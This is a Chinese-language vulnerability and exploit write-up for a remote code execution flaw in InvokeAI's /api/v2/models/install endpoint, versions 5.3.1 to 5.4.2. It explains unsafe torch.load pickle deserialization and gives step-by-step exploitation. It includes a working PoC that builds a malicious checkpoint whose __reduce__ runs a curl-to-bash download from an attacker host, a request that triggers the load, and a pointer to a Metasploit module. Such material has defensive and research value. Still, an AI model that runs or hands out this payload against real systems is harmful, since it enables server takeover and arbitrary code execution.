验证漏洞存在方法
    - 检查目标是否运行受影响版本的InvokeAI（5.3.1至5.4.2）
    - 验证`/api/v2/models/install`接口是否可访问：向`http://TARGET:9090/api/v2/models/install`发送POST请求，检查响应状态

漏洞利用方法
    - 这是一个发生在InvokeAI模型安装接口中的远程代码执行漏洞。受影响版本对外暴露`/api/v2/models/install`接口，允许从攻击者指定的任意URL下载模型文件。服务端在处理`.ckpt`等PyTorch checkpoint文件时，会使用`torch.load(path, map_location=torch.device("meta"))`反序列化文件内容。由于`torch.load`会触发基于pickle的不安全反序列化，攻击者可以在模型文件中构造带有恶意`__reduce__`方法的对象，使恶意命令在服务端加载模型时立即执行，从而以InvokeAI进程权限获得远程代码执行能力。
    
    - 详细利用流程如下：
        1. 攻击者先构造一个恶意的PyTorch checkpoint文件，在其中嵌入一个带有恶意`__reduce__`方法的对象，使其在反序列化时调用系统命令。
        2. 将该恶意文件放置在攻击者可控的HTTP服务器上，例如`http://ATTACKER/payload.ckpt`。
        3. 向目标InvokeAI实例发送对`/api/v2/models/install`的POST请求，在`source`参数中填入恶意checkpoint的远程地址，并可将`inplace=true`以便写入模型目录。
        4. 目标服务器下载文件后，在模型处理逻辑中调用`torch.load()`反序列化该文件。
        5. 由于checkpoint内包含恶意pickle reducer，服务端会在加载阶段执行攻击者指定的系统命令，例如下载并执行远程脚本，从而完成远程代码执行。
    
    - 示范性PoC可分为两部分。第一部分是生成恶意checkpoint文件：
        ```python
        # payload_gen.py
        import pickle, os
        
        class Payload:
            def __reduce__(self):
                return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))
        
        with open("payload.ckpt", "wb") as f:
            pickle.dump(Payload(), f)
        ```
        
        第二部分是向目标接口发起请求以触发加载：
        ```python
        import requests
        
        requests.post(
            "http://TARGET:9090/api/v2/models/install",
            params={
                "source": "http://ATTACKER/payload.ckpt",
                "inplace": "true"
            },
            json={},
            timeout=5,
        )
        ```
        
        当目标下载并加载`payload.ckpt`时，恶意对象会在`torch.load()`反序列化期间执行，从而触发命令执行。如果需要现成工具，也可直接使用Metasploit模块`exploit/linux/http/invokeai_rce_cve_2024_12029`。
